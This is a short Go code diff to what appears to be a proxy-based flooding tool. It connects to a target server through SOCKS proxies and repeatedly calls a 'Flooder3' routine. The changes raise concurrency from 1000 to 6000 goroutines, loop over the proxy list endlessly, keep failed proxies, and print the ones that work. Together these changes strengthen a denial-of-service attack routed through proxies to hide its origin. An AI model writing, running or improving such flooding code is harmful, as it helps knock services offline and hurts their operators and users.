@@ -73,11 +73,12 @@ func connect(proxyAddress string, serverAddress string, proxies []string, i int,
 	conn, err := dialSocks("tcp", serverAddress)
 
 	if err != nil {
-		proxies = remove(proxies, i)
+		//proxies = remove(proxies, i)
 		<-guard
 	} else {
 		for {
 			if methods.Flooder3(data, conn) {
+				fmt.Println(proxyAddress)
 				<-guard
 				return
 			}
@@ -95,11 +96,13 @@ func main() {
 	proxies := parseProxies()
 	data := methods.Data{Address: address, Loop: loop}
 
-	guard := make(chan struct{}, 1000)
+	guard := make(chan struct{}, 6000)
 
-	for i, proxy := range proxies {
-		guard <- struct{}{}
-		go connect(proxy, address, proxies, i, &data, guard)
-		//time.Sleep(1 * time.Millisecond)
+	for {
+		for i, proxy := range proxies {
+			guard <- struct{}{}
+			go connect(proxy, address, proxies, i, &data, guard)
+			//time.Sleep(1 * time.Millisecond)
+		}
 	}
 }
